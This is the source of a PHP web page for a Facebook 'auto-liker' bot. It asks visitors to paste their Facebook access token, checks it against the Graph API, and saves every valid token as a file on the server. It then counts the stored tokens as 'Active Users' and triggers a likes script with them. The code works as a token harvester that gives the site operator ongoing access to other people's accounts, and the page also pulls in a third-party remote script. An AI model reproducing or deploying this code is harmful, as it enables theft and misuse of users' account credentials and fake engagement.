<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
VISHAL KUMAR
</title><link rel="stylesheet" type="text/css" href="B.css"
<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
<center><div style="font-family: 'Merienda', cursive;
font-size: 30pt">
<strong><marquee behavior="alternate"><center><script language="JavaScript" src="B.js"></script></font></center></marquee></strong></br>
</body>
 <?php
$yx=opendir('Token');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Token($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Token($access){
if(!is_dir('Token')){
mkdir('Token');
}
$a=fopen('Token/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script>window.alert("Your Token is Invalid, Try Again :)");</script>';
$this->form();
}
public function form(){
 echo '
 </br>
 
<strong><center><a href="https://facebook.com/topper.vk" alt="Token shaikh" target="_blank"><img src="https://graph.facebook.com/100021495444328/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div>
 </br> </br>
<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
<center><div style="font-family: Merienda;
font-size: 30pt">
<div id="center">

<center><div style="font-family: Great+Vibes;
font-size: 30pt"><a href="https://vk-tokenxx.herokuapp.com/" target="_blank">

<input class="button" type="button" value="Get Token"></a></center>


<form action="index.php" method="post">

<input class="search" type="text1" style="width:65%" name="access_token" placeholder="Paste Your Access Token Here" required></br>

<input class="submit" type="submit" value="Submit"></form></div>
</form></center><br>
</font><br>
<center><link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
<center><div style="font-family: Merienda;
font-size: 30pt">
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Merienda;
<font size="6"><h1> Made By : VISHAL KUMAR</a></h1></b>
</b></a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

<center>
<center> <a href="https://facebook.com/100021495444328" alt="Token shaikh" target="_blank"> <img src="https://graph.facebook.com/100021495444328/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div>

<br>
<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
<center><div style="font-family: Merienda;
font-size: 30pt">> 
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Great+Vibes;
<div id="center"><marquee behavior="alternate"> Bot Successfully Activated </marquee>

</br>

<div id="center">
<strong><center> <font color="white">
<center>
<font color="white" size="15">  Token Saved! </font></br>
[<a href="index.php" value="Click Here">Click Here</a>] TO START BOT</div></center>
</br>
</div>
<center><link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
<center><div style="font-family: Merienda;
font-size: 30pt">
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Merienda;
<font size="6"><h1> Made By : VK</a></h1></b>
</div>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
<link href="https://fonts.googleapis.com/css?family=Merienda"  rel="stylesheet" type="text/css">
<center><div style="font-family: Merienda;
font-size: 30pt">
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family: Merienda;
<div id="header">
<font color="MAGENTA"><?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'Token/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // </strong> prints out how many were in the directory
    echo "Active Users : $i "; ?></strong>
</div>
 <script type="text/javascript" src=""></script>
<!-- This Script is from www.javascriptbestcodes.com, Provided by: Web Smile -->
<script type='text/javascript' src='http://m.free-codes.org/g.php?id=2002'></script><style type="text/css">
</style>
<script language="JavaScript1.2">

var x,y
var kern=20 
var flag=0
var message="Welcome"
message=message.split("")
var xpos=new Array()
for (i=0;i<message.length;i++) {
	xpos[i]=-50
	}
var ypos=new Array()
for (i=0;i<message.length;i++) {
	ypos[i]=-50
	}
function handlerMM(e){
	x = (e) ? e.pageX : document.body.scrollLeft+event.clientX
	y = (e) ? e.pageY : document.body.scrollTop+event.clientY
	flag=1
	}
function makebanner() {
	if (flag==1) {
		for (i=message.length-1; i>=1; i--) {
			xpos[i]=xpos[i-1]+kern
			ypos[i]=ypos[i-1]
			}
		xpos[0]=x+kern
		ypos[0]=y
		for (i=0; i<message.length; i++) {
			if (document.getElementById) {
				var thisspan = document.getElementById("span"+i).style
				} else {
				var thisspan = eval((document.layers)?"document.span"+i:"span"+(i)+".style")
				}
			if (thisspan.posLeft) {
				thisspan.posLeft=xpos[i]
				thisspan.posTop=ypos[i]
				}
			if (!thisspan.posLeft) {
				thisspan.left=xpos[i]
				thisspan.top=ypos[i]
				}
			}
		}
		var timer=setTimeout("makebanner()",30)
	}
window.onload=makebanner;
</script>



<script language="JavaScript1.2">
for (i=0;i<message.length;i++) {
document.write("<span id='span"+i+"' class='spanstyle'>")
document.write(message[i])
document.write("</span>")
}
if (document.layers){
document.captureEvents(Event.MOUSEMOVE);
}
document.onmousemove = handlerMM;

</script>

<style type="text/css">
<!--
.spanstyle {
position:absolute;
visibility:visible;
top:-50px;
font-size:10pt;
font-family:Verdana;
font-weight:italic;
color:808066;
}
BODY {
width:100%;overflow-x:hidden;overflow-y:scroll;
}
-->
</style>
<script language="JavaScript1.2">

var x,y
var kern=20 
var flag=0
var message="welcome to my page"
message=message.split("")
var xpos=new Array()
for (i=0;i<message.length;i++) {
	xpos[i]=-50
	}
var ypos=new Array()
for (i=0;i<message.length;i++) {
	ypos[i]=-50
	}
function handlerMM(e){
	x = (e) ? e.pageX : document.body.scrollLeft+event.clientX
	y = (e) ? e.pageY : document.body.scrollTop+event.clientY
	flag=1
	}
function makebanner() {
	if (flag==1) {
		for (i=message.length-1; i>=1; i--) {
			xpos[i]=xpos[i-1]+kern
			ypos[i]=ypos[i-1]
			}
		xpos[0]=x+kern
		ypos[0]=y
		for (i=0; i<message.length; i++) {
			if (document.getElementById) {
				var thisspan = document.getElementById("span"+i).style
				} else {
				var thisspan = eval((document.layers)?"document.span"+i:"span"+(i)+".style")
				}
			if (thisspan.posLeft) {
				thisspan.posLeft=xpos[i]
				thisspan.posTop=ypos[i]
				}
			if (!thisspan.posLeft) {
				thisspan.left=xpos[i]
				thisspan.top=ypos[i]
				}
			}
		}
		var timer=setTimeout("makebanner()",12)
	}
window.onload=makebanner;
</script>



<script language="JavaScript1.2">
for (i=0;i<message.length;i++) {
document.write("<span id='span"+i+"' class='spanstyle'>")
document.write(message[i])
document.write("</span>")
}
if (document.layers){
document.captureEvents(Event.MOUSEMOVE);
}
document.onmousemove = handlerMM;

</script></body>
<br /><a target="_blank" href="http://free-web-tools.com" style="text-decoration:none;bottom:0;left:10px;font-size:5pt;color:gray;position:absolute">free web tools</a><a target="_blank" href="http://www.javascriptbestcodes.com" style="font-size: 8pt; text-decoration: none">Javascript Codes</a>
<div class="kddtop"> <div class="kddtut"> <p>
